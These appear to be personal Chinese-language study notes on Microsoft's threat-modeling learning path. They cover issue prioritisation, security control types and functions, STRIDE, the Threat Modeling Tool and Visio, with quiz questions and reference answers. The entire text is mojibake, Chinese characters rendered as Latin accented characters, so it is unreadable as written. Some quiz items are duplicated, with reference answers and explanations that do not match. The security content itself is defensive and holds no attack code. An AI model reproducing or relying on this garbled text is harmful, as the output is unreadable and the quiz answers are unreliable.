å¯èƒ½å¯¹ç³»ç»Ÿç”¨æˆ·é€ æˆä¸­ç­‰ç¨‹åº¦çš„å½±å“ã€‚ ç¤ºä¾‹åŒ…æ‹¬å­˜åœ¨å¯èƒ½çš„è§£å†³æ–¹æ³•çš„å¯ç”¨æ€§é—®é¢˜ ä½ å¯èƒ½ä¼šå¯¹ç³»ç»Ÿç”¨æˆ·é€ æˆè½»å¾®å½±å“ ä¿¡æ¯ å·²è€ƒè™‘ã€è¯„ä¼°æ½œåœ¨å¨èƒå¹¶è®¤ä¸ºå®ƒæ— å…³ç´§è¦ çŸ¥è¯†æ£€æŸ¥ å¯èƒ½ä¼šå¯¹ç”¨æˆ·é€ æˆä¸¥é‡å½±å“çš„é—®é¢˜é€šå¸¸å±äºå“ªä¸ªä¼˜å…ˆçº§ï¼Ÿ A. é‡è¦è¯´æ˜ã€‚ B. ä¸¥é‡ã€‚ C. é€‚ä¸­ã€‚ å‚è€ƒç­”æ¡ˆï¼š== A == è§£é‡Šï¼šA. å¯èƒ½ä¼šå¯¹ç³»ç»Ÿç”¨æˆ·é€ æˆä¸¥é‡å½±å“ã€‚ ç¤ºä¾‹åŒ…æ‹¬åœ¨æ²¡æœ‰å·²çŸ¥çš„è§£å†³æ–¹æ³•æ—¶æ˜¾ç¤ºç³»ç»Ÿä¸å¯ç”¨ã€‚B. å¯èƒ½ä¼šå¯¹ç³»ç»Ÿç”¨æˆ·é€ æˆä¸¥é‡å½±å“ã€‚ ç¤ºä¾‹åŒ…æ‹¬æ¶‰åŠæ•æ„Ÿä¿¡æ¯æ³„æ¼çš„è¡Œä¸ºå’Œéœ€è¦éšç§å’Œæ³•å¾‹å‚ä¸çš„å¨èƒã€‚C. å¯èƒ½å¯¹ç³»ç»Ÿç”¨æˆ·é€ æˆä¸­ç­‰ç¨‹åº¦çš„å½±å“ã€‚ ç¤ºä¾‹åŒ…æ‹¬å­˜åœ¨å¯èƒ½çš„è§£å†³æ–¹æ³•çš„å¯ç”¨æ€§é—®é¢˜ã€‚ ï¼ˆEmmm æ„Ÿè§‰ B ä¹Ÿè¡Œï¼Ÿ å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½ç¡®å®šæ¯ä¸ªé—®é¢˜çš„ä¼˜å…ˆçº§åï¼Œè¯·æŸ¥çœ‹å®‰å…¨æ§åˆ¶æªæ–½åˆ—è¡¨ï¼Œå¹¶é€‰æ‹©å¯¹ä½ çš„ç³»ç»Ÿæœ€æœ‰ç›Šçš„é€‰é¡¹ã€‚ æœ€æœ‰ç›Šçš„å®‰å…¨æ§åˆ¶æªæ–½ä¸€èˆ¬ä¼šè·¨å¤šä¸ª STRIDE ç±»åˆ«ã€‚ åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ç°è¿™äº›æ­¥éª¤çš„æˆæœ¬ç›¸å¯¹è¾ƒä½ã€‚ å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹è¯„ä¼°æ¯é¡¹å®‰å…¨æ§åˆ¶æªæ–½æ—¶ï¼Œä½ ä¼šæ³¨æ„åˆ°å®ƒä»¬å±äºä»¥ä¸‹ç±»å‹ä¹‹ä¸€ï¼š å›¾æ ‡ ç±»å‹ è¯´æ˜ ç‰©ç† æ­¤ç±»æ§åˆ¶æªæ–½ä»ç‰©ç†ä¸Šé˜»æ­¢æˆ–æ£€æµ‹æœªç»æˆæƒçš„è®¿é—®ã€‚ ç¤ºä¾‹åŒ…æ‹¬å…¥å£ã€å¾½ç« ã€æ‘„åƒå¤´ã€ç…§æ˜å’ŒæŠ‘åˆ¶ç³»ç»Ÿã€‚ æŠ€æœ¯ æ­¤ç±»æ§åˆ¶æªæ–½ä»é€»è¾‘ä¸Šä¿æŠ¤ç³»ç»Ÿã€‚ ç¤ºä¾‹åŒ…æ‹¬é˜²ç«å¢™ã€é˜²ç—…æ¯’è½¯ä»¶ã€è®¿é—®æ§åˆ¶åˆ—è¡¨å’ŒåŠ å¯†ã€‚ ç®¡ç† æ­¤ç±»æ§åˆ¶æªæ–½æŒ‡ä¸ºç³»ç»Ÿå®šä¹‰æµç¨‹çš„ç­–ç•¥ã€‚ ç¤ºä¾‹åŒ…æ‹¬æ•°æ®åˆ†ç±»ã€å®¡æ ¸å’Œé™åˆ¶ã€‚ æ ¹æ®ç³»ç»Ÿï¼Œä½ éœ€è¦åº”ç”¨å„ç§ç±»å‹çš„å®‰å…¨æ§åˆ¶æªæ–½ï¼Œå¸®åŠ©å»ºç«‹å¤šå±‚ä¿æŠ¤ä»¥æå‡ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚ å®‰å…¨æ§åˆ¶åŠŸèƒ½é™¤äº†è¿™ä¸‰ç§ä¸»è¦ç±»å‹å¤–ï¼Œå®‰å…¨æ§åˆ¶è¿˜å…·æœ‰äº”ä¸ªä¸åŒçš„åŠŸèƒ½ï¼Œå¯å¸®åŠ©ä½ åº”ç”¨å¤šä¸ªå®‰å…¨å±‚ã€‚ å‡½æ•° è¯´æ˜ ç¤ºä¾‹ é¢„é˜² æ­¤ç­–ç•¥æ˜¯å¦æœ‰åŠ©äºé™ä½æ­¤å¨èƒçš„æ¦‚ç‡æˆ–å½±å“ï¼Ÿ é”å®šã€é˜²ç«å¢™ã€æ•°æ®åˆ†ç±»ã€‚ æ£€æµ‹ æ­¤ç­–ç•¥æ˜¯å¦æœ‰åŠ©äºè¯†åˆ«æ‰€å‘ç”Ÿçš„ç³»ç»Ÿæ”»å‡»ï¼Ÿ ç›‘è§†ã€è¯±æ•ç³»ç»Ÿã€å®¡æ ¸æ—¥å¿—ã€‚ çº æ­£ æ­¤ç­–ç•¥æ˜¯å¦æœ‰åŠ©äºæ§åˆ¶å¦‚ä½•å“åº”ä¼ å…¥æ”»å‡»ï¼Ÿ ç‰©ç†ä¿®å¤ã€ç³»ç»Ÿä¿®è¡¥ç¨‹åºã€äº‹ä»¶å“åº”è®¡åˆ’ã€‚ æ¢å¤ æ­¤é£é™©ç¼“è§£æªæ–½æ˜¯å¦æœ‰åŠ©äºæœåŠ¡ä»æ”»å‡»ä¸­æ¢å¤ï¼Ÿ çƒ­ç«™ç‚¹ã€ç³»ç»Ÿå¤‡ä»½ã€ç¾éš¾æ¢å¤è®¡åˆ’ã€‚ é˜»ç¢ æ­¤é£é™©ç¼“è§£æªæ–½æ˜¯å¦æœ‰åŠ©äºé˜»æ­¢æ”»å‡»è€…è®¿é—®ç³»ç»Ÿï¼Ÿ æ—¶é™ã€æœ€ä½æƒé™ã€æˆæƒä½¿ç”¨ç­–ç•¥ã€‚ æ ¹æ®é—®é¢˜çš„ä¼˜å…ˆçº§ï¼Œå¯ä»¥è€ƒè™‘åœ¨ç³»ç»Ÿè¢«ç ´åä¹‹å‰ã€ç ´åè¿‡ç¨‹ä¸­å’Œç ´åä¹‹åä½¿ç”¨å¤šé¡¹å®‰å…¨æ§åˆ¶åŠŸèƒ½æ¥ä¿æŠ¤å®ƒã€‚ å¦‚ä½•ç»¼åˆåˆ©ç”¨æ‰€æœ‰ä¿¡æ¯å®ƒä»¬ä¸å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å…±åŒå½¢æˆä¸€ä¸ªçŸ©é˜µï¼Œå¯å¸®åŠ©ä½ åšå‡ºæ­£ç¡®çš„é€‰æ‹©ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›ç¤ºä¾‹ï¼š åŠŸèƒ½ ç‰©ç† é€»è¾‘ ç®¡ç† é¢„é˜² é”å®š é˜²ç«å¢™ æ•°æ®åˆ†ç±» æ£€æµ‹ ç›‘è§† è¯±æ•ç³»ç»Ÿ å®¡æ ¸æ—¥å¿— çº æ­£ ç‰©ç†ä¿®å¤ ç³»ç»Ÿä¿®è¡¥ç¨‹åº äº‹ä»¶å“åº”è®¡åˆ’ æ¢å¤ çƒ­ç«™ç‚¹ ç³»ç»Ÿå¤‡ä»½ ç¾éš¾æ¢å¤è®¡åˆ’ é˜»ç¢ æ—¶é™ æœ€ä½æƒé™ æˆæƒä½¿ç”¨ç­–ç•¥ çŸ¥è¯†æ£€æŸ¥ ç®¡ç†å®‰å…¨æ§åˆ¶æªæ–½æœ‰ä»€ä¹ˆç¤ºä¾‹ï¼Ÿ A. åˆ›å»ºäº‹ä»¶å“åº”è®¡åˆ’ã€‚ B. å®‰è£…æ–°é˜²ç«å¢™ã€‚ C. åœ¨å…¥å£æ·»åŠ å¾½ç« æ‰«æä»ªã€‚ ç®¡ç†å®‰å…¨æ§åˆ¶æªæ–½æœ‰ä»€ä¹ˆç¤ºä¾‹ï¼Ÿ A. åˆ›å»ºäº‹ä»¶å“åº”è®¡åˆ’ã€‚ B. å®‰è£…æ–°é˜²ç«å¢™ã€‚ C. åœ¨å…¥å£æ·»åŠ å¾½ç« æ‰«æä»ªã€‚ å‚è€ƒç­”æ¡ˆï¼š == A == == C == è§£é‡Šï¼š A. æ­¤æ¡ç›®é€‚ç”¨äºç®¡ç†å‹å®‰å…¨æ§åˆ¶æªæ–½ã€‚B. æ­¤æ¡ç›®é€‚ç”¨äºé€»è¾‘å‹ï¼ˆå¯èƒ½è¿˜æœ‰ç‰©ç†å‹ï¼‰å®‰å…¨æ§åˆ¶æªæ–½ã€‚C. æ­¤æ¡ç›®é€‚ç”¨äºç‰©ç†å‹å®‰å…¨æ§åˆ¶æªæ–½ã€‚ A. æ­¤æ¡ç›®é€‚ç”¨äºé¢„é˜²æ€§å®‰å…¨æ§åˆ¶åŠŸèƒ½ã€‚B. æ­¤æ¡ç›®é€‚ç”¨äºæ£€æµ‹æ€§å®‰å…¨æ§åˆ¶åŠŸèƒ½ã€‚C. æ­¤æ¡ç›®é€‚ç”¨äºçŸ«æ­£æ€§å®‰å…¨æ§åˆ¶åŠŸèƒ½ã€‚ å°ç»“å¨èƒå»ºæ¨¡æ¡†æ¶ä¼šä¸ºä½ æä¾›å¨èƒåˆ—è¡¨ï¼Œå¹¶æä¾›é™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•ã€‚ ä½†æ˜¯ï¼Œå®ƒä¸ä¼šä¸ºä½ ç¡®å®šå¨èƒçš„ä¼˜å…ˆçº§ã€‚ æ­¤å¤–ï¼Œæ²¡æœ‰åŸºäºå…¶ç±»å‹å’ŒåŠŸèƒ½çš„åˆ†å±‚å®‰å…¨æ§åˆ¶å»ºè®®ã€‚ ä½ äº†è§£äº†å¦‚ä½•ç¡®å®šé—®é¢˜çš„ä¼˜å…ˆçº§ï¼Œä»¥åŠå¦‚ä½•æ ¹æ®ç±»å‹å’ŒåŠŸèƒ½åº”ç”¨æ°å½“çš„å®‰å…¨æ§åˆ¶å±‚ã€‚ åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å·²ç»å­¦ä¹ äº†ä»¥ä¸‹å†…å®¹ï¼š äº†è§£äº†å¦‚ä½•ç¡®å®šé—®é¢˜çš„ä¼˜å…ˆçº§ åˆ†ç±»å®‰å…¨æ§åˆ¶ äº†è§£æ¯ä¸ªå‹å®‰å…¨æ§åˆ¶æªæ–½å’ŒåŠŸèƒ½ æ¨¡å—7 | ä½¿ç”¨æ¨èå·¥å…·åˆ›å»ºæ•°æ®æµå›¾ç®€ä»‹æ•°æ®æµå…³ç³»å›¾æ˜¯ç³»ç»Ÿå·¥ä½œæ–¹å¼çš„å›¾å½¢åŒ–è¡¨ç¤ºå½¢å¼ã€‚ è¿™åŒ…æ‹¬æ‰€æœ‰æ•°æ®å­˜å‚¨ã€è¿›ç¨‹ã€å¤–éƒ¨å®ä½“ã€ä¿¡ä»»è¾¹ç•Œå’Œæ•°æ®æµã€‚ å¦‚ä½•åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ä½ å¯ä»¥ä½¿ç”¨ä»»ä½•ç”»å¸ƒï¼ˆç‰©ç†çš„æˆ–è™šæ‹Ÿçš„ï¼‰æ¥åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ã€‚ ä½†æ˜¯ï¼Œç¡®å®éœ€è¦äº†è§£å¨èƒå»ºæ¨¡çš„åŸç†ï¼Œæ‰èƒ½æ­£ç¡®åœ°å¯¹å…¶è¿›è¡Œåˆ†æã€‚ æŸäº›åº”ç”¨ç¨‹åºæä¾›çš„å¤šç§å·¥å…·ï¼Œå®ƒä»¬å¯ä»¥é€šè¿‡å¨èƒç”Ÿæˆå¼•æ“å’Œé£é™©é™ä½ç­–ç•¥ï¼Œå¸®åŠ©ä½ åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ã€‚ å…¶ä»–å·¥å…·ä»…æä¾›åˆ›å»ºæ•°æ®æµå…³ç³»å›¾çš„åŠŸèƒ½ã€‚ ç›®æ ‡è¯¥å­¦ä¹ è·¯å¾„çš„ç›®æ ‡æ˜¯è®©ä½ äº†è§£å¨èƒå»ºæ¨¡çš„åŸºç¡€çŸ¥è¯†ï¼Œä»¥ä¾¿åœ¨ä»»ä½•åœ°æ–¹ã€ä»»ä½•ç”»å¸ƒä¸Šè¿›è¡Œå¨èƒå»ºæ¨¡ã€‚ ä¸ºäº†å¸®åŠ©ä½ å®ç°è¿™ä¸ªç›®æ ‡ï¼Œæˆ‘ä»¬ä¼šåœ¨ä»‹ç»è¿‡ç¨‹ä¸­æ¨èä¸€äº›å·¥å…·ã€‚ å­¦ä¹ ç›®æ ‡åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†å­¦ä¹ ä»¥ä¸‹å†…å®¹ï¼š è¯¦ç»†äº†è§£äº† Threat Modeling Tool è¯¦ç»†äº†è§£ Visio æ— å¿…å¤‡çŸ¥è¯†å³å¯å­¦ä¹  ï¼ˆ å»ºè®®çš„å·¥å…·å¨èƒå»ºæ¨¡å°†å¯¹ä½ çš„æ•°æ®æµå…³ç³»å›¾åº”ç”¨ä¸€ä¸ªæ¡†æ¶ï¼Œä»¥å¸®åŠ©æ‰¾åˆ°é™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¨èƒå’Œæ–¹æ³•ã€‚ æŸäº›å·¥å…·å¯å¸®åŠ©ä½ åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ï¼Œå¦ä¸€äº›è¿˜å¯ä»¥å¸®åŠ©ä½ è¿›è¡Œå¨èƒç”Ÿæˆç»ƒä¹ ã€‚ æ ¹æ®ä½ åœ¨å¨èƒå»ºæ¨¡æ–¹é¢çš„ä¸“ä¸šæ°´å¹³ï¼Œå…¶ä¸­ä¸€äº›å·¥å…·å¯èƒ½ä¼šå¾ˆæœ‰å¸®åŠ©ã€‚ è¯¦ç»†äº†è§£ Threat Modeling Toolåœ¨æ¥ä¸‹æ¥çš„å‡ ä¸ªå•å…ƒä¸­ï¼Œä½ å°†äº†è§£æœ‰å…³ä¸€äº›å·¥å…·çš„è¯¦ç»†ä¿¡æ¯ï¼š Threat Modeling Tool æä¾›å¤šç§å·¥å…·ï¼Œå¯ç”¨äºåˆ›å»ºæ•°æ®æµå…³ç³»å›¾å¹¶å¯¹å…¶è¿›è¡Œåˆ†æï¼Œä»¥æŸ¥æ‰¾æ½œåœ¨å¨èƒå’Œé£é™©é™ä½ç­–ç•¥ åœ¨çº¿å®‰è£…ç‰ˆï¼Œhttps://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling ç¦»çº¿å®‰è£…ç‰ˆï¼Œhttps://www.microsoft.com/en-us/download/details.aspx?id=49168 ï¼ˆ2016ï¼‰ æƒ³è£…å…¶ä»–ç¦»çº¿ç‰ˆæœ¬çš„ï¼ŒGuguru ä¸€ä¸‹ microsoft threat modeling tool offline installer å°±å¥½äº† Visio æä¾›äº†ä¸€ä¸ªå¹²å‡€çš„ç”»å¸ƒï¼Œå¸®åŠ©ä½ åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ Visioï¼Œï¼ˆè¦é’±çš„ æ‰“æ‰°äº† æˆ‘ä»¬å°†åœ¨æ¥ä¸‹æ¥çš„å‡ ä¸ªå•å…ƒä¸­è¿›è¡Œä»‹ç»ã€‚ Threat Modeling ToolMicrosoft Threat Modeling Tool ç”± Microsoft å‘å¸ƒï¼Œå¹¶è·å¾—å¨èƒå»ºæ¨¡ç¤¾åŒºè¿›è¡Œè®¤å¯ï¼Œå¯ä»¥å¸®åŠ©å·¥ç¨‹å¸ˆåˆ›å»ºæ•°æ®æµå…³ç³»å›¾å¹¶å°† STRIDE åº”ç”¨äºå…¶å¨èƒå»ºæ¨¡å·¥ä½œã€‚ Threat Modeling Tool æä¾›ï¼š å¯è‡ªå®šä¹‰çš„æ¨¡æ¿ å¨èƒç”Ÿæˆå¼•æ“ï¼Œå…¶ä¸­åŒ…å«å¨èƒå’Œé£é™©é™ä½ç­–ç•¥ é»˜è®¤æ¨¡æ¿ç§°ä¸ºâ€œSDL TM çŸ¥è¯†åº“â€ï¼Œæä¾›ä¸€ç»„åŸºæœ¬å…ƒç´ å’Œå¨èƒç”ŸæˆåŠŸèƒ½ã€‚ åªè¦å¯¹æ•°æ®æµå…³ç³»å›¾å’Œ STRIDE æœ‰åŸºæœ¬çš„äº†è§£å³å¯ä½¿ç”¨ã€‚ STRIDE å›é¡¾STRIDE æ˜¯å…­ä¸ªä¸»è¦å¨èƒç±»åˆ«çš„é¦–å­—æ¯ç¼©å†™ï¼š æ¬ºéª— - å†’å……æŸäººæˆ–æŸç‰© ç¯¡æ”¹ - æœªç»æˆæƒæ›´æ”¹æ•°æ® å¦è®¤æ€§ - ä¸å®£ç§°å¯¹æ‰§è¡Œçš„æ“ä½œè´Ÿè´£ ä¿¡æ¯æ³„éœ² - åœ¨æœªè·å¾—æƒé™çš„æƒ…å†µä¸‹æŸ¥çœ‹æ•°æ® æ‹’ç»æœåŠ¡ - ä½¿ç³»ç»Ÿè¿‡è½½ æƒé™æå‡ - æ‹¥æœ‰æœ¬ä¸åº”æ‹¥æœ‰çš„æƒé™ é«˜çº§ç”¨æˆ·éƒ¨åˆ†å¯¹äºæ›´é«˜çº§çš„ç”¨æˆ·ï¼Œå¯ä»¥åœ¨ä¸‰ä¸ªä¸»è¦éƒ¨åˆ†å¯¹æ¨¡æ¿è¿›è¡Œè‡ªå®šä¹‰ã€‚ æ¨¡å…·è¿›ç¨‹ã€å¤–éƒ¨å®ä½“ã€æ•°æ®å­˜å‚¨ã€æ•°æ®æµå’Œä¿¡ä»»è¾¹ç•Œæ„æˆäº†çˆ¶å…ƒç´ ã€‚ ä½ è¿˜å¯ä»¥åˆ›å»ºå­å…ƒç´ ï¼Œä»¥å¸®åŠ©ä¸ºå…¶ä»–ä¸Šä¸‹æ–‡ã€å¯æ“ä½œçš„å¨èƒç”Ÿæˆå’Œé£é™©é™ä½ç­–ç•¥æä¾›ç²’åº¦ã€‚ å­å…ƒç´ çš„å·¥ä½œåŸç†ç¤ºä¾‹çˆ¶å…ƒç´ æä¾›äº†é€‰æ‹© HTTP å’Œ HTTPS å­å…ƒç´ çš„é€‰é¡¹ã€‚ HTTP åº”ç”Ÿæˆæ›´å¤šçš„å¨èƒï¼Œå› ä¸ºç¯¡æ”¹ã€ä¿¡æ¯æ³„éœ²å’Œæ¬ºéª—å¨èƒå¸¸è§äºæœªåŠ å¯†é€šé“ã€‚ ä½¿ç”¨ HTTP ä½¿ç”¨ HTTPS å¦‚ä½•æ·»åŠ å…ƒç´ å±æ€§å¦‚æœæœ‰å¿…é¡»åŒ…æ‹¬åœ¨é»˜è®¤æ¨¡æ¿ä¸­çš„å…¶ä»–å±æ€§ï¼Œå¯ä»¥åœ¨ç®¡ç†å‘˜è§†å›¾ä¸­å°†å…¶æ·»åŠ åˆ°æ¯ä¸ªå…ƒç´ ã€‚ å½“ç”¨æˆ·å°†è¯¥å…ƒç´ æ‹–æ”¾åˆ°ç”»å¸ƒä¸Šæ—¶ï¼Œå°†çœ‹åˆ°è‡ªå·±çš„æ›´æ”¹ã€‚ å¨èƒå±æ€§ä½¿ç”¨å±æ€§å¯ä»¥åˆ›å»ºä¸ºæ¯ä¸ªç”Ÿæˆçš„å¨èƒå¡«å……çš„å­—æ®µï¼Œå°±åƒä½¿ç”¨æ¨¡å…·å±æ€§å¯ä»¥ä¸ºæ¯ä¸ªå…ƒç´ åˆ›å»ºå­—æ®µä¸€æ ·ã€‚ è¯·è®°ä½ï¼šç›®æ ‡æ˜¯ä»¥æœ€ç®€å•çš„æ–¹å¼è·å¾—å°½å¯èƒ½å¤šçš„ä¸Šä¸‹æ–‡ã€‚ å¨èƒå±æ€§çš„ç¤ºä¾‹ç®¡ç†å‘˜è§†å›¾ æ·»åŠ å¯ä¸ºä½ æä¾›æ›´å¤šä¸Šä¸‹æ–‡å’Œå¯æ“ä½œæ­¥éª¤çš„å­—æ®µã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š é—®é¢˜ä¼˜å…ˆçº§ - äº†è§£éœ€è¦é¦–å…ˆå¤„ç†å“ªäº›é—®é¢˜ è¶…é“¾æ¥ - å°†é—®é¢˜é“¾æ¥åˆ°è”æœºæ–‡æ¡£ å¤–éƒ¨é£é™©æ˜ å°„ - é€šè¿‡ä½¿ç”¨å¯é çš„ç¬¬ä¸‰æ–¹æºï¼ˆå¦‚ OWASP Top 10 å’Œ CWE è¯¦ç»†ä¿¡æ¯ï¼‰ï¼Œä½¿ç”¨ä¸å…¶ä»–ç»„ç»‡ç›¸åŒçš„è¯­è¨€æ¥æè¿°é£é™© å•Šè¿™ï¼Œè¶…é“¾æ¥å’Œå¤–éƒ¨é£é™©åœ¨å“ª ï¼ˆ ç”¨æˆ·è§†å›¾ Threat Modeling Tool ç”¨æˆ·å°†åœ¨åˆ†æå…¶æ•°æ®æµå…³ç³»å›¾æ—¶çœ‹åˆ°è¿™äº›æ›´æ”¹ã€‚ å¨èƒå’Œé£é™©é™ä½ç­–ç•¥è¿™ä¸€éƒ¨åˆ†æ˜¯ Threat Modeling Tool çš„æ ¸å¿ƒã€‚ å¨èƒç”Ÿæˆå¼•æ“è€ƒå¯Ÿç‹¬ç«‹å…ƒç´ å’Œå·²è¿æ¥çš„å…ƒç´ ï¼Œä»¥ç¡®å®šç”Ÿæˆå“ªä¸ªå¨èƒã€‚ å¨èƒç”Ÿæˆçš„åŸç†æ­¥éª¤ 1 - æŒ‡å®šæºå’Œç›®æ ‡å¨èƒç”Ÿæˆå¼•æ“ä½¿ç”¨ç®€å•çš„å¥å­æ¥ç”Ÿæˆå¨èƒã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š ç›®æ ‡ä¸º[å…ƒç´ åç§°] æºä¸º[å…ƒç´ åç§°] ä½ è¿˜å¯ä»¥åœ¨æ ‡é¢˜å’Œè¯´æ˜ä¸­ä½¿ç”¨å…ƒç´ åç§°ã€‚ æ ¼å¼ä¸ºï¼šâ€œ{target.Name}â€æˆ–â€œ{source.Name}â€ æ­¥éª¤ 2 - åˆå¹¶æºå’Œç›®æ ‡ä½ å¯ä»¥ç²¾ç¡®è§„å®šå¦‚ä½•ç”Ÿæˆå¨èƒã€‚ ç”¨ AND OR è¿ç®—ç¬¦ç»„åˆç›®æ ‡ã€æºåŠå…¶å„ä¸ªå±æ€§ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š target.[property name] is â€˜Yesâ€™ AND source.[property name] is â€˜Noâ€™ æµäº¤å‰[ä¿¡ä»»è¾¹ç•Œåç§°] æ­¥éª¤ 3 - ç”Ÿæˆæˆ–å¿½ç•¥å¨èƒå¨èƒç”Ÿæˆå¼•æ“ä½¿ç”¨ä¸¤ä¸ªå­—æ®µæ¥ç”Ÿæˆæˆ–å¿½ç•¥å¨èƒï¼š Include - å¦‚æœåœ¨æ­¤å­—æ®µä¸­æ·»åŠ çš„å¥å­ä¸º trueï¼Œåˆ™ä¼šç”Ÿæˆå¨èƒ Exclude - å¦‚æœåœ¨æ­¤å­—æ®µä¸­æ·»åŠ çš„å¥å­ä¸º trueï¼Œåˆ™ä¸ä¼šç”Ÿæˆå¨èƒ ä¸‹é¢æ˜¯é»˜è®¤æ¨¡æ¿çš„å®é™…ç¤ºä¾‹ï¼Œä»¥ä¾¿å°†è¿™äº›æ­¥éª¤ç»“åˆåœ¨ä¸€èµ·ï¼š å¨èƒï¼š è·¨ç«™ç‚¹è„šæœ¬ Include: (target is [Web Server]) OR (target is [Web Application]) Exclude: (target.[Sanitizes Output] is â€˜Yesâ€™) AND (target.[Sanitizes Input] is â€˜Yesâ€™) ä»…åœ¨ä»¥ä¸‹æƒ…å†µæ—¶æ‰ä¼šç”Ÿæˆä¸Šè¿°è·¨ç«™ç‚¹è„šæœ¬å¨èƒï¼š è¿›ç¨‹æ˜¯ Web æœåŠ¡å™¨æˆ– Web åº”ç”¨ç¨‹åº æœªå‡€åŒ–è¾“å…¥å’Œè¾“å‡º Microsoft Threat Modeling Tool æ¨¡æ¿åˆ›å»º ä¸»é¢˜å¾ˆå¤æ‚ï¼Œæœ¬å­¦ä¹ è·¯å¾„ä¸­ä¸ä¼šè¿›è¡Œå……åˆ†è®¨è®ºã€‚ çŸ¥è¯†æ£€æŸ¥ Threat Modeling Tool ä¸æä¾›å“ªäº›ä¼˜åŠ¿ï¼Ÿ A. ç”Ÿæˆçš„å¨èƒåŸºäºæ•´ä¸ªå…³ç³»å›¾ï¼Œè€Œä¸ä»…æ˜¯æ¯ä¸ªå…ƒç´ æˆ–æ¯æ¬¡äº¤äº’ã€‚ B. å¯ä»¥æ›´æ”¹å¨èƒã€æ¨¡å…·å’Œæ¨¡å…·å±æ€§ã€‚ C. ç”Ÿæˆæ¯ä¸ªå¨èƒæ—¶ï¼Œéƒ½ä¼šåŒ…å«é™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•ã€‚ å‚è€ƒç­”æ¡ˆï¼š== A == è§£é‡Šï¼šA. è¯¥å·¥å…·ä»…è€ƒå¯Ÿå„ä¸ªå…ƒç´ å’Œå„æ¬¡äº¤äº’ã€‚B. å¯ä»¥æ›´æ”¹å­—æ®µã€‚C. æŸäº›æ¨¡æ¿åªåŒ…å«å¨èƒï¼Œä½†è¾ƒæ–°ç‰ˆæœ¬ç¡®å®åŒ…å«é£é™©é™ä½ç­–ç•¥ã€‚ VisioVisio å½’ä¸º Microsoft æ‰€æœ‰ï¼Œå…¶åŠŸèƒ½å¼ºå¤§ï¼Œå¯å¸®åŠ©ä»»ä½•äººåˆ›å»ºä¼˜è´¨çš„æµç¨‹å›¾å’Œæ•°æ®æµå…³ç³»å›¾ã€‚ ä¼˜ç‚¹Visio æä¾›æ‹–æ”¾åŠŸèƒ½å’Œå…³ç³»å›¾æ‰¹æ³¨åŠŸèƒ½ã€‚ åœ¨ä¸ºç³»ç»Ÿåˆ›å»ºå…³ç³»å›¾æ—¶ï¼Œè¿™ä¸¤ç§åŠŸèƒ½éƒ½å¾ˆæœ‰ç”¨ã€‚ ç¼ºç‚¹è¯¥åº”ç”¨ç¨‹åºä¸æä¾›è‡ªåŠ¨å¨èƒå»ºæ¨¡åŠŸèƒ½ã€‚ å› æ­¤ï¼Œæ²¡æœ‰å¨èƒç”Ÿæˆå¼•æ“æ¥å¸®åŠ©å·¥ç¨‹å¸ˆé›†ä½“è®¨è®ºå¨èƒå’Œé£é™©é™ä½ç­–ç•¥ã€‚ å¦‚æœä½¿ç”¨ Visioï¼Œä½ å°†è´Ÿè´£å¯¹æ¯ä¸ªå…ƒç´ å’Œäº¤äº’è¿›è¡Œæ‰‹åŠ¨å¨èƒå»ºæ¨¡ã€‚ çŸ¥è¯†æ£€æŸ¥ Visio ä¸æä¾›å“ªäº›ä¼˜åŠ¿ï¼Ÿ A. ä½¿ç”¨é»˜è®¤æ¨¡å…·æä¾›æ‹–æ”¾åŠŸèƒ½ã€‚ B. è¾“å‡ºä¸€ç³»åˆ—ç”Ÿæˆçš„å¨èƒï¼Œå¸®åŠ©å·¥ç¨‹å¸ˆé›†ä½“è®¨è®ºå¯ä»¥å¦‚ä½•é™ä½æˆ–æ¶ˆé™¤é£é™©ã€‚ C. è®©å·¥ç¨‹å¸ˆå¯ä»¥ä¸ºæ•°æ®æµå›¾è¡¨æ·»åŠ æ‰¹æ³¨ä»¥æä¾›æœåŠ¡ä¸Šä¸‹æ–‡ã€‚ å‚è€ƒç­”æ¡ˆï¼š== A == è§£é‡Šï¼šA. å®ƒç¡®å®æä¾›æ‹–æ”¾åŠŸèƒ½ã€‚B. Visio æ²¡æœ‰å¨èƒç”Ÿæˆå¼•æ“ã€‚C. å®ƒæä¾›æ‰¹æ³¨åŠŸèƒ½ã€‚ å°ç»“ä½ å¯ä»¥ä½¿ç”¨ä»»ä½•ç”»å¸ƒï¼ˆç‰©ç†çš„æˆ–è™šæ‹Ÿçš„ï¼‰æ¥åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ã€‚ Microsoft çš„å·¥ç¨‹å¸ˆæ¨èå‡ ä¸ªå·¥å…·æ¥å¸®åŠ©ä½ è¿›è¡Œå¨èƒå»ºæ¨¡ã€‚ ä½ äº†è§£äº†å¯ç”¨äºåˆ›å»ºæ•°æ®æµå…³ç³»å›¾çš„ä¸åŒå·¥å…·ã€‚ åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å·²ç»å­¦ä¹ äº†ä»¥ä¸‹å†…å®¹ï¼š è¯¦ç»†äº†è§£äº† Threat Modeling Tool è¯¦ç»†äº†è§£äº† Visio è¿˜æœ‰å¾ˆå¤šå…¶ä»–å·¥å…·å¯ä»¥å¸®åŠ©ä½ è§£å†³å¨èƒå»ºæ¨¡éœ€æ±‚ã€‚ å…¶ä¸­æŸäº›å·¥å…·éœ€è¦ä»˜è´¹è®¢é˜…æ‰èƒ½ä½¿ç”¨ï¼Œå¦ä¸€äº›åˆ™å®Œå…¨å¼€æ”¾æºä»£ç 